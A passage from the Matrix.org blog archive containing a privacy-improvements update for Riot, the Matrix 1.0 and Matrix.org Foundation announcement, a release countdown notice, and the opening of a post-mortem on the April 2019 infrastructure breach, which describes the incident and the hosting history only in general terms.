address or phone number) and scalar.vector.im as an Integration Manager (i.e.
the mechanism for adding hosted bots/bridges/widgets into rooms). This means
that Riot, even if using a custom homeserver and running from a custom Riot
deployment, will try to talk to *.vector.im (run  by New Vector; the company formed by the core
Matrix team in 2017) for some operations unless an alternative IS or IM has
been specified in the config.</p>
<p>We haven't done as good a job at explaining this as we could have, and this
blog post is a progress update on how we're fixing that and improving other
privacy considerations in general.</p>
<p>Firstly, the reason Riot is configured like this is for the user's convenience:
in general, we believe most users just want to discover other people on Matrix
as easily as possible, and a logically-centralised server for looking up user
matrix IDs by email/phone number (called third party IDs, or 3PIDs) is the only
comprehensive way of doing so.  Decentralising this data while protecting the
privacy of the 3PIDs and their matrix IDs is a Hard Problem which we're unaware
of anyone having solved yet.  Alternatively, you could run a local identity
server, but it will end up having to delegate to a centralised identity server
anyway for IDs it has no other way to know about. Similarly, providing a
default integration server that just works out of the box (rather than
mandating the user configures their own) is a matter of trying to keep Riot's
UX simple, especially when onboarding users, and especially given Riot's
reputation for complexity at the best of times.</p>
<p>That said, the discussion highlighted some areas for improvement.
Specifically:</p>
<ol>
<li>When doing work on making Matrix <a href="https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix">GDPR
compliant</a>
back in May 2018, we set up a single <a href="https://github.com/vector-im/policies/blob/master/docs/matrix-org/privacy_notice.md">privacy
policy</a>
for the services we run, and got users to agree to it by locking them out of
the matrix.org homeserver until they did.  However, we missed that users not
on the matrix.org homeserver might still be using our Identity Service (IS)
&amp; Integration Manager (IM) without accepting the privacy policy.  Over the
last few weeks we've been working on addressing this - it turns out that
it's a pain to fix, given the Identity Service doesn't have the concept of
users, so tracking which users have agreed to the policy policy or not means
some fairly major changes. The current proposal is to change the Identity
Service to use a form of OpenID to authenticate users against their
homeserver in order to check they've accepted the IS's terms of use - see
<a href="https://github.com/matrix-org/matrix-doc/pull/2140">MSC2140</a> for the gory
details.</li>
</ol>
<p>Meanwhile, Riot is being updated to prompt the user to accept the IS &amp; IM terms
of use (if different to the HS's), and thus make it crystal clear to the user
that they are using an IS &amp; IM and that they have the option not to if desired - see https://github.com/vector-im/riot-web/issues/10167 and associated
<a href="https://github.com/vector-im/riot-web/issues?utf8=%E2%9C%93&amp;q=is%3Aissue+label%3Ap1+label%3Aprivacy+label%3Aphase%3A1+identity">issues</a>.
This includes also explicitly prompting the user as to whether they want
3PIDs they provide at registration to be discoverable, as per
https://github.com/vector-im/riot-web/issues/10091.</p>
<ol start="2">
<li>
<p>Riot on iOS &amp; Android gives the option of scanning your local addressbook to
discover which of your contacts are on Matrix.  The wording explaining this
wasn't clear enough on Android - which we <a href="https://news.ycombinator.com/item?id=20181515">promptly
fixed</a>.  Separately, the
contact details sent to the server are currently not obfuscated.  This is
partially because we hadn't got to it, and partially because obfuscating
them doesn't actually help much with privacy, given an attacker can just
scan through possible obfuscated phone numbers and email addresses to
deobfuscate them.  However, we've been working through obfuscating the
contact details anyway by hashing as per
<a href="https://github.com/matrix-org/matrix-doc/pull/2134">MSC2134</a>, which has all
the details.  We're also adding an explicit lookup warning in Riot/Web, as
per https://github.com/vector-im/riot-web/issues/10093.</p>
</li>
<li>
<p>There was a bug where Riot/Web was querying the Integration Manager every
time you opened a room, even if that room had no integrations (actually, it
did it 3 times in a row).  This got <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3115">fixed and
released</a> in
Riot/Web 1.2.2 back on June 19th.</p>
</li>
<li>
<p>Matrix needs to authenticate whether events were actually sent by the server
that claimed to send them.  We do this by having servers sign their events
when they create them, and publishing the public half of their signing keys
for anyone to query.  However, this poses problems if you receive an event
which is signed by a server which isn't currently online.  To solve this, we
have the concept of <code>trusted_key_servers</code> (aka notary servers), which your
server can query to see if they know about the missing server's keys.  By
default, matrix.org is configured as Synapse's trusted notary, but you can
of course change this. If you choose an unreliable server as the notary
(e.g. by not setting one at all) then there's a risk that you won't be able
to look up signing keys, and a splitbrain will result where your server
can't receive certain events, but other servers in the room can.  This can
then result in your server being unable to participate in the room entirely,
if it's missing key events in the room's lifetime.</p>
<p>Our plan here is to get rid of notaries entirely by changing how event
signing works as per
<a href="https://github.com/matrix-org/matrix-doc/issues/1228">MSC1228</a>, but this is
going to take a while.  Meanwhile we're going to check Synapse's code to
ensure it doesn't talk to the notary server unnecessarily.  (E.g. it should
be caching the signing keys locally, and it should only use the notary
server if the remote server is down.)</p>
</li>
<li>
<p>When doing VoIP in Matrix, clients need to use a TURN server to discover
their network conditions and perform firewall traversal.  The TURN server
should be specified by your homeserver (and each homeserver deployment
should ideally include a TURN server).  However, for users who have not
configured a TURN server, Riot (on all 3 platforms) defaulted to use
Google's public STUN service (<code>stun.l.google.com</code>).  STUN is a subset of
TURN which provides firewall discovery, but not traffic relaying.  This
slightly increased the chances of calls working for users without a proper
TURN server, but not by much - and rather than fall back to Google, we've
decided to simply remove it from Riot (e.g.
https://github.com/matrix-org/matrix-ios-sdk/commit/24832a2b14fb72ae6f051d5aba40262d11eef65d).
This means that VoIP might get less reliable for users who were relying on
this fallback, but you really should be running your own TURN server anyway
if you want VoIP to work reliably on your homeserver.</p>
</li>
<li>
<p>We should make it clearer in Riot that device names are world-readable, and
not just for the user's own personal reference. This is
https://github.com/vector-im/riot-web/issues/10216</p>
</li>
</ol>
<p>As you can see, much of the work on improving these issues is still in full
swing, although some has already shipped.  As should also be obvious, these
issues are categorically not malicious: Matrix (and Riot) literally exists to give users full control and autonomy over their communication, and privacy is a key part of that. These are avoidable issues which can and will be solved.  It's worth noting that we have to prioritise privacy issues alongside all the other development in Matrix however: there's no point in having excellent privacy if there are other bugs stopping the platform from being usable.</p>
<p>We'll do another blog post to confirm once most of the fixes here have landed -
meanwhile, hopefully this post provides some useful visibility on how we're
going about improving things.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;06&#x2F;11&#x2F;introducing-matrix-1-0-and-the-matrix-org-foundation&#x2F;" title="Introducing Matrix 1.0 and the Matrix.org Foundation">Introducing Matrix 1.0 and the Matrix.org Foundation</a></h2>
                <span>
                    11.06.2019 00:00
                    —
                    <a href="/category/general">
                        General
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <h2 id="matrix-1-0">Matrix 1.0</h2>
<p>Hi all,</p>
<p>We are very excited to announce the first fully stable release of the Matrix protocol and specification across **all **APIs - as well as the Synapse 1.0 reference implementation which implements the full Matrix 1.0 API surface.</p>
<p>This means that after just over 5 years since the initial work on Matrix began, we are proud to have finally <strong>exited beta</strong>!!  This is the conclusion of the work which we announced at <a href="https://matrix.org/blog/2019/02/04/matrix-at-fosdem-2019">FOSDEM 2019</a> when we cut the first stable release of the Server-Server API and began the Synapse 0.99 release series in anticipation of releasing a 1.0.</p>
<p>Now, before you get too excited, it’s critical to understand that Matrix 1.0 is all about providing a <strong>stable, self-consistent, self-contained and secure version of the standard</strong> which anyone should be able to use to independently implement production-grade Matrix clients, servers, bots and bridges etc.  It does <strong>not</strong> mean that all planned or possible features in Matrix are now specified and implemented, but that the most important core of the protocol is a well-defined stable platform for everyone to build on.</p>
<p>On the Synapse side, our focus has been exclusively on ensuring that Synapse correctly implements Matrix 1.0, to provide a stable and secure basis for participating in Matrix without risk of room corruption or other nastinesses.  However, we have deliberately <strong>not</strong> focused on performance or features in the 1.0 release - so I’m afraid that synapse’s RAM footprint will not have got significantly better, and your favourite long-awaited features (automatically defragmenting rooms with lots of forward extremities, configurable message retention, admin management web-interface etc) have not yet landed.  In other words, this is the opposite of the <a href="https://medium.com/@RiotChat/the-big-1-0-68fa7c6050be">Riot 1.0 release</a> (where the entire app was redesigned and radically improved its performance and UX) - instead, we have adopted the mantra to <a href="http://wiki.c2.com/?MakeItWorkMakeItRightMakeItFast">make it work, make it work right, and then (finally) make it fast</a>.  You can read the <a href="/blog/2019/06/11/synapse-1-0-0-released">full release notes</a> here.  It’s also worth looking at the <a href="https://github.com/matrix-org/synapse/blob/release-v1.0.0/CHANGES.md">full changelog</a> through the Synapse 0.99 release series to see the massive amount of polishing that’s been going on here.</p>
<p>All this means that the main headline features which land in Matrix 1.0 are vitally important but relatively dry:</p>
<ul>
<li>Using X.509 certificates to trust servers rather than perspective notaries, to simplify and improve server-side trust.  This is a <strong>breaking change</strong> across Matrix, and we’ve given the community several months now to ensure their homeservers run a valid TLS certificate.  See <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md">MSC1711</a> for full details, and the <a href="https://matrix.org/blog/2019/05/24/final-countdown-to-1-0">2 week warning</a> we gave.  As of ~9am UTC today, the matrix.org homeserver is running Synapse 1.0 and enforcing valid TLS certificates - the transition has begun (and so far we haven’t spotted any major breakage :).  Thank you to everyone who <a href="https://arewereadyyet.com">got ready</a> in advance!</li>
<li>Using .well-known URIs to discover servers, in case you can’t get a valid TLS certificate for your server’s domain.</li>
<li>Switching to <strong><a href="https://matrix.org/docs/spec/rooms/v4.html">room version 4</a> by default</strong> for creating new rooms.  This fixes the most important defects that the core room algorithm has historically encountered, particularly:
<ul>
<li>The new State Resolution algorithm to fix the <a href="https://github.com/matrix-org/synapse/issues/2432">Hotel California bug</a> and many others: <a href="https://github.com/matrix-org/matrix-doc/issues/1442">State Resolution Reloaded</a></li>
<li><a href="https://github.com/matrix-org/matrix-doc/pull/1659">Collision resistant event IDs</a></li>
</ul>
</li>
<li>Specifying the ability to upgrade between room versions</li>
<li>Full specification of lazy loading room members</li>
<li><a href="https://github.com/matrix-org/matrix-doc/issues/1267">Short Authentication String</a> (Emoji!) interactive verification of E2EE devices</li>
<li>...and lots and lots and lots of bugfixes and spec omission fixes.</li>
</ul>
<p>That said, there is a <em>lot</em> of really exciting stuff in flight right now which sadly didn’t stabilise in time for Matrix 1.0, but will be landing as fast as we can finalise it now that 1.0 is at last out the door.  This includes:</p>
<ul>
<li>Editable messages!  (These are in Synapse 1.0 and Riot already, but still stabilising so not enabled by default)</li>
<li>Reactions! (Similarly these are in develop)</li>
<li>Threading!! (We’ve planted the seeds for this in the new ‘aggregations’ support which powers edits &amp; reactions - but full thread support is still a bit further out).</li>
<li><a href="https://github.com/uhoreg/matrix-doc/blob/cross-signing2/proposals/1756-cross-signing.md">Cross-signed verification for end-to-end encryption</a> (This is on a branch, but due to land any day now).  We’ve also held off merging E2E backups into the Matrix 1.0 spec until cross-signing lands, given it may change the backup behaviour a bit.  Once this is done, we can seriously talk about turning on E2E by default everywhere.</li>
<li>Live-tracking of room statistics and state in Synapse!  (This is in Synapse 1.0 already if you check out the new room_stats and room_state tables, but we need to provide a nice admin interface for it).</li>
<li>Support for smaller footprint homeservers by reducing memory usage and stopping them from joining overly complex rooms.</li>
</ul>
<p>Then stuff which we haven’t yet started, but is now unlocked by the 1.0 release:</p>
<ul>
<li>Fixing extremities build-up (and so massively improving performance)</li>
<li>Rewriting Communities.  Groups/Communities deliberately didn’t land in Matrix 1.0 as the current implementation has issues we want to fix first.  <a href="https://github.com/matrix-org/matrix-doc/pull/1772">MSC1772</a> has the details.</li>
<li>Rewritten room directory using the new room stats/state tables to be super-speedy.</li>
<li>Super-speedy <a href="https://github.com/matrix-org/synapse/pull/3122">incremental state resolution</a></li>
<li>Removing MXIDs from events (<a href="https://github.com/matrix-org/matrix-doc/issues/1228">MSC1228</a>)</li>
</ul>
<p>Just to give a quick taster of the shape of things to come, here’s RiotX/Android, the all-new Riot client for Android, showing off Edits &amp; Reactions in the wild…</p>
<div style="text-align: center">
<img src="/blog/img/edits.jpg" style="height: 640px;"/>
</div>
<p>...and here’s a screenshot of the final test jig for cross-signing devices in end-to-end encryption, so you will never have to manually verify new devices for a trusted user ever again!  We demoed a <em>very</em> early version of this at FOSDEM, but this here is the testing harness for real deal, after several iterations of the spec and implementation to nail down the model. + means the device/user's cross-signing key is trusted, T means it's TOFU:</p>
<div style="text-align: center">
<img src="/blog/img/cross-signing.png" style="height: 480px; margin: auto"/>
</div>
<p>So, there you have it - welcome to Matrix 1.0, and we look forward to our backlog of feature work now landing!</p>
<p>Massive massive thanks to everyone who has stuck with the project over the years and helped support and grow Matrix - little did we think back in May 2014 that it’d take us this long to exit beta, but hopefully you’ll agree that it’s been worth it :)</p>
<p>Talking of which, we were looking through the photos we took from the first ever session hacking on Matrix back in May 2014…</p>
<p><img src="/blog/img/nightmare.jpg" alt="Whiteboard 1" /></p>
<p>...suffice it to say that of the architectural options, we went with #3 in the end...</p>
<p><img src="/blog/img/pl.jpg" alt="Whiteboard 2" /></p>
<p>...and that nowadays we actually know how power levels work, in excruciating and (hopefully) well-specified detail :)</p>
<p>There has been an absolutely enormous amount of work to pull Matrix 1.0 together - both on the spec side (thanks to the Spec Core Team for corralling proposals, and everyone who's contributed proposals, and particularly to Travis for editing it all) and the implementation side (thanks to the whole Synapse team for the tedious task of cleaning up everything that was needed for 1.0).  And of course, huge thanks go to everyone who has been helping test and debug the Synapse 1.0 release candidates, or just supporting the project to get to this point :)</p>
<h2 id="the-matrix-org-foundation">The Matrix.org Foundation</h2>
<p>Finally, as promised, alongside Matrix 1.0, we are very happy to announce the official launch of the finalised Matrix.org Foundation!</p>
<p>This has been a long-running project to ensure that Matrix’s future is governed by a neutral non-profit custodian for the benefit of everyone in the Matrix ecosystem.  We started the process nearly a year ago back with the initial proposal <a href="https://matrix.org/blog/2018/06/20/towards-open-governance-for-matrix-org">Towards Open Governance of Matrix.org</a>, and then legally <a href="https://matrix.org/blog/2018/10/29/introducing-the-matrix-org-foundation-part-1-of-2">incorporated the Foundation</a> in October, and published the <a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1779/proposals/1779-open-governance.md">final governance proposal</a> in January.</p>
<p>As of today the Foundation is finalised and operational, and all the assets for Matrix.org have been transferred from <a href="https://vector.im">New Vector</a> (the startup we formed in 2017 to hire the core Matrix team).  In fact you may already have seen Matrix.org Foundation notices popping up all over the Matrix codebase (as all of New Vector’s work on the public Matrix codebase for the foreseeable is being assigned to the Matrix.org Foundation).</p>
<p>Most importantly, we’re excited to introduce the <strong>Guardians of the Matrix.org Foundation</strong>.  The Guardians are the legal directors of the non-profit Foundation, and are responsible for ensuring that the Foundation (and by extension the Spec Core Team) keeps on mission and neutrally protects the development of Matrix. Guardians are typically independent of the commercial Matrix ecosystem and may even not be members of today’s Matrix community, but are deeply aligned with the mission of the project. Guardians are selected to be respected and trusted by the wider community to uphold the guiding principles of the Foundation and keep the other Guardians honest.</p>
<p>We have started the Foundation with five Guardians - two being the original founders of the Matrix project (Matthew and Amandine) and three being entirely independent, thus ensuring the original Matrix team forms a minority which can be kept in check by the rest of the Guardians. The new Guardians are:</p>
<ul>
<li>
<p>Prof. Jon Crowcroft - Marconi Professor of Communications Systems in the Computer Lab at the University of Cambridge and the Turing Institute. Jon is a pioneer in the field of decentralised communication, and a fellow of the Royal Society, the ACM, the British Computer Society, the Institution of Engineering and Technology, the Royal Academy of Engineering and the Institute of Electrical and Electronics Engineers.</p>
<p>Jon is a global expert in decentralisation and data privacy, and is excellently placed to help ensure Matrix stays true to its ideals.</p>
</li>
<li>
<p>Ross Schulman - Ross is a senior counsel and senior policy technologist at New America’s Open Technology Institute, where he focuses on internet measurement, emerging technologies, surveillance, and decentralization. Prior to joining OTI, Ross worked for Google.</p>
<p>Ross brings a unique perspective as a tech- and decentralisation-savvy lawyer to the Foundation, as well as being one of the first non-developers in the Matrix community to run his own homeserver. Ross has been known to walk around Mozfest clutching a battery-powered Synapse in a box, promoting decentralised communication for all.</p>
</li>
<li>
<p>Dr. Jutta Steiner - As co-founder and CEO of Parity Technologies, Jutta is dedicated to building a better internet - Web 3.0 - where users’ privacy &amp; control come first. Parity Technologies is a leader in the blockchain space – known to many as the creator of one of the most popular Ethereum clients, it is also the creator of two ambitious new blockchain technlogies, Polkadot and Substrate, that make it easier to experiment and innovate on scalability, encryption and governance.</p>
<p>Parity has been pioneering Matrix enterprise use since the moment they decided to rely on Matrix for their internal and external communication back in 2016, and now run their own high-volume deployment, with end-to-end encryption enabled by default. Jutta represents organisations who are professionally dependent on Matrix day-to-day, as well as bringing her unique experiences around decentralisation and ensuring that Web 3.0 will be a fair web for all.</p>
</li>
</ul>
<p>We’d like to offer a very warm welcome to the new Guardians, and thank them profusely for giving up their time to join the Foundation and help ensure Matrix stays on course for the years to come.</p>
<p>For the full update on the Foundation, please check out the new website content at <a href="https://matrix.org/foundation">https://matrix.org/foundation</a> which should tell you everything you could possibly want to know about the Foundation, the Guardians, the Foundation’s legal Articles of Association, and the day-to-day Rules which define the Open Governance process.</p>
<h2 id="and-finally">And finally…</h2>
<p>Matrix 1.0 has been a bit of an epic to release, but puts us on a much stronger footing for the future.</p>
<p>However, it’s very unlikely that we’d have made it this far if most of the core dev team wasn’t able to work on Matrix as their day job.  Right now we are actively looking for large-scale donations to the Matrix.org Foundation (and/or investment in <a href="https://vector.im">New Vector</a>) to ensure that the team can maintain as tight a focus on core Matrix work as possible, and to ensure the project realises its full potential.  While Matrix is growing faster than ever, this perversely means we have more and more distractions - whether that’s keeping the Matrix.org server safe and operational, or handling support requests from the community, or helping new members of the ecosystem get up and running.  If you would like Matrix to succeed, please <a href="mailto:funding@matrix.org">get in touch</a> if you’d like to sponsor work, prioritise features, get support contracts, or otherwise support the project.  We’re particularly interested in sponsorship around decentralised reputation work (e.g. publishing a global room directory which users can filter based on their preferences).</p>
<p>Finally, huge thanks to everyone who has continued to support us through thick and thin on <a href="https://patreon.com/matrixdotorg">Patreon</a>, <a href="https://liberapay.com/matrixdotorg">Liberapay</a> or other platforms.  Every little helps here, both in terms of practically keeping the lights on, and also inspiring larger donations &amp; financial support.</p>
<p>So: thank you once again for flying Matrix.  We hope you enjoy 1.0, and we look forward to everything else landing on the horizon!</p>
<p>- Matthew, Amandine &amp; the whole Matrix.org Team.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;05&#x2F;24&#x2F;final-countdown-to-1-0&#x2F;" title="Final countdown to 1.0">Final countdown to 1.0</a></h2>
                <span>
                    24.05.2019 00:00
                    —
                    <a href="/category/general">
                        General
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>After lots of refinements, polishing and a few distractions we’re finally at the point of announcing the final timeline for both Matrix 1.0 and Synapse 1.0! We are targeting <strong>Monday 10th June</strong> as our release date - please consider this your two week warning!</p>
<p>This is the end game of the process we began back in February when we released the <a href="https://matrix.org/blog/2019/02/04/matrix-at-fosdem-2019">first stable release of the Server-Server API</a> at FOSDEM, and started the <a href="https://matrix.org/blog/2019/02/05/synapse-0-99-0">Synapse 0.99</a> release series to prepare for 1.0.</p>
<p>Matrix 1.0 refers to the upcoming set of API releases which provides a matched set of stable and secure APIs across all of Matrix - at which point the project (at last) exits beta! In practice, this will be Client-Server API 0.5 (including final membership lazy loading, E2E backups and interactive verification and lots more), SS API 0.2 (including server key validity period fixes and associated v5 room protocol) and any other spec updates. The next 2 weeks will see a flurry of spec activity as we get everything together - you can see the full list and track the progress for the CS 0.5 spec release at https://github.com/matrix-org/matrix-doc/projects/2.</p>
<p>Meanwhile, Synapse 1.0 will be the reference implementation of Matrix 1.0, and so makes the changes required to implement Matrix 1.0 and close all currently known security and stability issues and thus exit beta. This means changing the default room protocol version used for new rooms to be <a href="https://github.com/matrix-org/matrix-doc/blob/37871106c6fc6013c17b5711fb93853fff140267/proposals/2002-rooms-v4.md">v4</a>, which includes the new <a href="https://github.com/matrix-org/matrix-doc/blob/f714aaadd011ac736d779f8460202a8d95799123/proposals/1442-state-resolution.md">state resolution algorithm</a>, as well as <a href="https://github.com/matrix-org/matrix-doc/blob/erikj/event_id_hashes/proposals/1659-event-id-as-hashes.md">collision-resistant event IDs</a>, which are now formatted to be <a href="https://github.com/matrix-org/matrix-doc/blob/rav/proposal/no_slash_in_event_id/proposals/1884-replace-slashes-in-event_ids.md">URL safe</a>. <strong>Support for v4 rooms shipped in <a href="https://matrix.org/blog/2019/05/21/synapse-0-99-5-1-released">Synapse 0.99.5.1</a>, so please upgrade asap to 0.99.5.1 before 1.0 is released to ease the transition.</strong>. Synapse 1.0 will also ship with support for the upcoming v5 room protocol (which enforces honouring server key validity periods), but this will not used as the default for new rooms until sufficient servers are speaking Matrix 1.0.</p>
<p>As part of the security work, Matrix 1.0 and Synapse 1.0 also contains a <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything">breaking change</a> that requires a valid TLS certificate on the federation API endpoint. <strong>Servers that do not configure their certificate will no longer be able to federate post 1.0</strong></p>
<p>You can check that your server has been correctly configured <a href="https://federationtester.matrix.org/">here</a> and see <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md">here</a> for more info on what you need to do. If in doubt head to <a href="https://matrix.to/#/#synapse:matrix.org">#synapse:matrix.org</a>.</p>
<p>We've been tracking readiness for the certificate change at https://arewereadyyet.com, at the time of writing 68% of active <em>servers</em> on the federation have valid certificates. We obviously would want that number to be higher, however since the largest installations <em>have</em> upgraded the total number of <em>users</em> who are ready for 1.0 stands at 96%, which we consider to be high enough to release 1.0.</p>
<p><img src="/blog/img/awry.2019-05-24.png" alt="" /></p>
<p><strong>This is not a drill</strong>, from here until 10th June we need everyone to not only ensure that their own server is ready, but also to encourage their fellow admins to update as well. With your help we can get everyone over the line!</p>
<p>Thanks everyone for your help to date, especially those providing support in <a href="https://matrix.to/#/#synapse:matrix.org">#synapse:matrix.org</a>.</p>
<p>Onwards!</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;" title="Post-mortem and remediations for Apr 11 security incident">Post-mortem and remediations for Apr 11 security incident</a></h2>
                <span>
                    08.05.2019 00:00
                    —
                    <a href="/category/general">
                        General
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <h3 id="table-of-contents">Table of contents</h3>
<ul>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#introduction">Introduction</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#history">History</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-incident">The Incident</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-defacement">The Defacement</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-rebuild">The Rebuild</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#remediations">Remediations</a>
<ul>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh">SSH</a>
<ul>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-keys-should-give-minimal-access">SSH keys should give minimal access</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#two-factor-authentication">Two factor authentication</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</a></li>
</ul>
</li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#network-architecture">Network architecture</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#keeping-patched">Keeping patched</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#intrusion-detection">Intrusion detection</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#incident-management">Incident management</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#configuration-management">Configuration management</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#secure-packaging">Secure packaging</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#dev-and-ci-infrastructure">Dev and CI infrastructure</a></li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</a></li>
</ul>
</li>
<li><a href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#conclusion">Conclusion</a></li>
</ul>
<h3 id="introduction">Introduction</h3>
<p>Hi all,</p>
<p>On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via <a href="https://twitter.com/matrixdotorg/status/1116304867683905537">Twitter</a> and our <a href="https://matrix.org/blog/2019/04/11/security-incident/">blog</a>, but in this post we’ll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.</p>
<p>Firstly, please understand that <strong>this incident was not due to issues in the Matrix protocol itself or the wider Matrix network</strong> - and indeed everyone who wasn’t on the Matrix.org server should have barely noticed.  If you see someone say “Matrix got hacked”, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but <strong>the protocol and network itself was not impacted</strong>.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but <strong>this incident was not related to the protocol</strong>.</p>
<p>Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.</p>
<p>In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.</p>
<p>This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)</p>
<p>Meanwhile, if you think that the world needs Matrix, <strong>please</strong> consider supporting us via <a href="https://patreon.com/matrixdotorg">Patreon</a> or <a href="http://liberapay.com/matrixdotorg">Liberapay</a>.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like <a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> (E2EE compatibility for all Matrix clients/bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.</p>
<p>Finally, if you happen across security issues in Matrix or matrix.org’s infrastructure, please please consider disclosing them responsibly to us as per our <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a>, in order to help us improve our security while protecting our users.</p>
<h3 id="history">History</h3>
<p>Firstly, some context about Matrix.org’s infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.</p>
<p>The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our <a href="https://matrix.org/blog/2017/07/07/a-call-to-arms-supporting-matrix/">funding situation</a> at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on <a href="https://upcloud.com">UpCloud</a>, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot/Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.</p>
<p>In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn’t spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn’t tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we’d got this right in the past, we’d be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.</p>
